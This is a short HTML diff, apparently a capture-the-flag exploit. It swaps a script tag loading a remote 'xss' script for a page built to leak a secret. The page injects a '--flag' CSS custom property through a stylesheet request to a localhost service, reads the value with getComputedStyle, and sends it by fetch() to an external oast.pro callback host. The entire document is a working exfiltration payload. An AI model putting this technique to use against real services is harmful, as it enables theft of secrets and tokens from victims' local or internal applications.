@@ -1,1 +1,14 @@
-<script src="https://cdn.jsdelivr.net/gh/Kortsec1/xss@latest/test5.js"></script>
+<html>
+<head>
+    <link rel="stylesheet" type="text/css" href="http://127.0.0.1:80/css?prefix=p{--flag:" />
+</head>
+<body>
+<p id="hoppi">hi</p>
+<script>
+    setTimeout(()=>{
+        let flag = getComputedStyle(hoppi).getPropertyValue('--flag')
+        fetch('https://d01z47gz1wg0000q7n6ggoy91dayyyyyb.oast.pro?flag='+flag)
+    }, 200)
+</script>
+</body>
+</html>
